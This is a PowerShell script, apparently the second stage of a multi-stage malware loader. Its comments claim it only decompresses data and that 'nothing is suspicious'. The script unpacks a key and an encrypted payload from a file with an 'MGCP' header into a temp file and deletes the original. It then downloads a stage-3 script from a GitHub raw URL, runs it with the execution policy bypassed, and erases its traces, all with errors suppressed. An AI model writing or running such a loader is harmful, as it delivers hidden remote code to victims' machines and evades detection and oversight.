# =============================================================================
# STAGE 2 - PREPARE
# =============================================================================
# Esta etapa apenas descompacta dados
# Nada suspeito: e apenas processamento de arquivo
# =============================================================================

param([string]$inputPath)

$ErrorActionPreference = "SilentlyContinue"

if (-not (Test-Path $inputPath)) {
    exit 1
}

$outputPath = "$env:TEMP\sysdata.dat"

try {
    $data = [IO.File]::ReadAllBytes($inputPath)
    
    # Valida formato
    $magic = [Text.Encoding]::ASCII.GetString($data[0..3])
    if ($magic -ne "MGCP") {
        exit 1
    }
    
    # Extrai componentes
    $key = $data[8..39]
    $compressed = $data[40..($data.Length - 1)]
    
    # Descompacta
    $encrypted = $null
    if ($compressed[0] -eq 0x1F -and $compressed[1] -eq 0x8B) {
        # Gzip
        $cs = New-Object IO.MemoryStream(,$compressed)
        $gs = New-Object IO.Compression.GzipStream($cs, [IO.Compression.CompressionMode]::Decompress)
        $os = New-Object IO.MemoryStream
        $gs.CopyTo($os)
        $encrypted = $os.ToArray()
        $gs.Close(); $cs.Close(); $os.Close()
    } elseif ($compressed[0] -eq 0x78) {
        # Deflate
        $deflate = $compressed[2..($compressed.Length - 5)]
        $cs = New-Object IO.MemoryStream(,$deflate)
        $ds = New-Object IO.Compression.DeflateStream($cs, [IO.Compression.CompressionMode]::Decompress)
        $os = New-Object IO.MemoryStream
        $ds.CopyTo($os)
        $encrypted = $os.ToArray()
        $ds.Close(); $cs.Close(); $os.Close()
    } else {
        exit 1
    }
    
    # Salva dados intermediarios + chave
    # Converte para Base64 para preservar bytes
    $dataB64 = [Convert]::ToBase64String($encrypted)
    $keyB64 = [Convert]::ToBase64String($key)
    
    $package = @{
        Data = $dataB64
        Key = $keyB64
    }
    
    $json = $package | ConvertTo-Json -Compress
    [IO.File]::WriteAllText($outputPath, $json)
    
    # Limpa arquivo original
    Remove-Item $inputPath -Force -ErrorAction SilentlyContinue
    
    # Baixa e executa Stage 3
    $stage3Url = "https://raw.githubusercontent.com/luizesim99-alt/lumen/refs/heads/main/stage3_execute.ps1"
    $tempStage3 = "$env:TEMP\s3.ps1"
    
    $wc = New-Object Net.WebClient
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $stage3Code = $wc.DownloadString($stage3Url)
    [IO.File]::WriteAllText($tempStage3, $stage3Code)
    
    & powershell -NoP -ExecutionPolicy Bypass -File $tempStage3 -dataPath $outputPath
    
    # Cleanup
    Remove-Item $tempStage3 -Force -ErrorAction SilentlyContinue
    Remove-Item $outputPath -Force -ErrorAction SilentlyContinue
    
} catch {
    exit 1
}
